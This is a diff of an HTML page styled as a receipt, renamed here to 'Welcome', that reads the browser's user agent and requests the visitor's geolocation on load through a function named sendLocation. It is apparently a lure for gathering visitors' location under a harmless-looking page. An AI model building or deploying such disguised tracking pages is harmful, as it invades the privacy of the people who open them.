@@ -4,20 +4,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Receipt</title>
+  <title>Welcome</title>
   <link rel="stylesheet" href="styles.css" />
 </head>
 
 <body>
   <div class="comprovante-container">
-    <h1>Receipt</h1>
+    <h1>Welcome</h1>
 
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Status:</span> Receipt OK</p>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <button class="botao" onclick="window.print()">Print</button>
 
     <div class="comprovante-footer">
       <p>NVM.</p>
@@ -28,6 +27,9 @@
 
   <script>
     window.addEventListener("load", () => {
+      // display user agent
+      document.getElementById("user-agent").textContent = navigator.userAgent;
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
